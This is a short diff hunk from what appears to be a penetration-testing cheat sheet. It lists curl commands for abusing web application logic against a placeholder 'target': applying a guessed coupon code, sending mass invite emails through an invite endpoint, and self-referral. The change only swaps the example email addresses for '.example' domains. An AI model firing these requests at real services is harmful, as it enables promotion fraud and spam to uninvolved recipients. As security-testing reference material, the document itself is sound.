@@ -135,7 +135,7 @@ curl -s "http://target/api/coupon/apply" -d '{"code":"Discount50"}'
 # Email/notification abuse — trigger mass emails (send array with 100+ entries)
 curl -s -X POST "http://target/api/invite" \
   -H "Content-Type: application/json" \
-  -d '{"emails":["a1@x.com","a2@x.com","a3@x.com","a4@x.com","a5@x.com"]}'
+  -d '{"emails":["a1@identity.example","a2@identity.example","a3@identity.example","a4@identity.example","a5@identity.example"]}'
 
 # Referral abuse — refer yourself
 curl -s -X POST "http://target/api/referral" \
